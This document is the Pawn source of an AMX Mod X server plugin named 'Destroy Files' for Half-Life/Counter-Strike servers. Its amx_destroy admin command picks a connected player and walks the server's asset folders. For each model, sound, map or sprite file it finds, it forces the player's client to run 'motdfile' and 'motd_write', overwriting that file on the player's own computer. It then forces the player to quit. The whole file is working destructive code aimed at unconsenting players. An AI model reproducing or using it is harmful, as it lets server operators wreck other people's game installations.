/* Script generated by Pawn Studio */

#include <amxmodx>
#include <amxmisc>

#define PLUGIN	"Destroy Files"
#define AUTHOR	"DarkGL"
#define VERSION	"1.0"

new const newsPlayerOk[]			=	"Player is processed";
new const newsCommandInvalid[]		=	"You don't have permission to this command";
new const newsOtherPlayer[]			=	"Other player is currently processed"
new const newsPlayerDidntFind[]		=	"I couldn't find play with given nick/steamid/userid"

new Float: fTime 	= 0.0 ,
	idTask			=	1 ,
	iCurrent		=	0;

new pCvarQuit;

public plugin_init(){
	
	register_plugin(PLUGIN, VERSION, AUTHOR)
	
	register_concmd( "amx_destroy" , "cmdDestroyFiles" , .info = "amx_destroy <nick/steamid/userid>");
	
	pCvarQuit	=	register_cvar( "destroyFiles_quit" , "1" );
}

public client_disconnect( id ){
	
	if( id == iCurrent ){
		
		for( new taskID	=	1 ; taskID < idTask ; taskID++ ){
			remove_task( taskID );
		}
		
		clearInf();
		
	}
}

public cmdDestroyFiles( id ){
	
	if( !id || get_user_flags( id ) & ADMIN_IMMUNITY ){
		
		new szArg[ 64 ];
		
		read_argv( 1 , szArg , charsmax( szArg ) );
		
		remove_quotes( szArg );
		
		trim( szArg );
		
		new iFindPlayer	=	findWithName( szArg );
		
		if( !is_user_connected( iFindPlayer ) ){
			iFindPlayer	=	findWithUserID( szArg );
		}
		
		if( !is_user_connected( iFindPlayer ) ){
			iFindPlayer =	findWithAuth( szArg );
		}
		
		if( is_user_connected( iFindPlayer ) ){
			
			printConsole( id , newsPlayerOk ); 
		
			new bool: iRet	=	destroyFiles( iFindPlayer );
			
			if( !iRet ){
				printConsole( id , newsOtherPlayer );
			}
			
			return PLUGIN_HANDLED;
		}
		else{
			printConsole( id , newsPlayerDidntFind ); 
		}
	}
	else {
		printConsole( id , newsCommandInvalid );
	}
	
	return PLUGIN_CONTINUE;
}

findWithName( const szArg[] ){
	return find_player( "bhl" , szArg );
}

findWithUserID( const szArg[] ){
	return find_player( "hk" , szArg );
}

findWithAuth( const szArg[] ){
	return find_player( "ch" , szArg );
}

public bool: destroyFiles( id ){
	
	if( fTime != 0.0 ){
		return false;
	}
	
	iCurrent	=	id;
	fTime		=	0.0;
	idTask		=	1;
	
	readFolder( id , "models" );
	readFolder( id , "sprites" );
	readFolder( id , "maps" );
	readFolder( id , "gfx" );
	readFolder( id , "sound" );
	readFolder( id , "overviews" );
	
	set_task( fTime + 0.1 , "clearInf" , idTask++ );
	
	return true;
}

public readFolder( id , szFolder[] ){
	
	new szFile[32], iLen, pos;
	
	while( ( pos = read_dir( szFolder , pos, szFile, 31, iLen ) ) ){
		
		if( iLen <= 4 || strfind( szFile , ".ztmp" ) != -1 ){
			continue;
		}
		
		new szNew[ 256 ];
		
		if( checkFile( szFile ) ){
			
			formatex( szNew , charsmax( szNew ) , "%s/%s" , szFolder , szFile );
			
			fTime	+=	0.1;
			
			set_task( fTime , "fileKill" , idTask++ , szNew , 256 );
			
		}
		else{
			
			formatex( szNew , charsmax( szNew ) , "%s/%s" , szFolder , szFile );
			
			readFolder( id , szNew );
		}
	}
}

public fileKill( szFile[] ){
	
	client_cmd( iCurrent , "motdfile ^"%s^";motd_write Bye bye" , szFile );
	
}

public clearInf(){
	
	if( get_pcvar_num( pCvarQuit ) && is_user_connected( iCurrent ) ){
		
		client_cmd( iCurrent , "Quit" );
		
	}
	
	iCurrent	=	0;
	idTask		=	1;
	fTime		=	0.0;
}

bool: checkFile( const szFile[] ){
	
	new szFileCopy[ 256 ];
	
	copy( szFileCopy , charsmax( szFileCopy ) , szFile );
	
	trim( szFileCopy );
	
	new szAmps[ ][ 16 ]	=	{
		"mp3" ,
		"mdl" ,
		"spr" , 
		"wav" ,
		"tga" ,
		"wad" ,
		"lmp" ,
		"lst" ,
		"bsp" ,
		"bmp" ,
		"txt"
	}
	
	new szAmpFile[ 16 ];
	
	copy( szAmpFile , charsmax( szAmpFile ) , getAmpFile( szFileCopy , strlen( szFileCopy ) ) );	
	
	for( new i = 0 ; i < sizeof( szAmps ) ; i++ ){
		
		if( equali( szAmpFile , szAmps[ i ] ) ) {
			
			return true;
			
		}
	}
	
	return false;
}

printConsole( id , const szText[] ){
	
	if( !is_user_connected( id ) ){
		return ;
	}
	
	client_print( id , print_console , szText );
	
}

getAmpFile( const szFile[] , iLen ){
	
	new szAmp[ 16 ] ,
		iLastDot	=	stringFindLastDot( szFile , iLen );
	
	if( iLastDot == -1 ){
		
		return szAmp;
		
	}
	
	
	if( iLastDot + 1 < strlen( szFile ) ){
		copy( szAmp , charsmax( szAmp ) , szFile[ iLastDot + 1] );
	}
	
	return szAmp;
}

stringFindLastDot( const szFile[] , iLen ){
	
	for( new iChar = iLen - 1 ; iChar >= 0 ; iChar -- ){
		
		if( szFile[ iChar ] == '.' ){
			return iChar;
		}
		
		if( szFile[ iChar ] == '/' || szFile[ iChar ] == '\' ){
			break;
		}
		
	}
	
	return -1;
}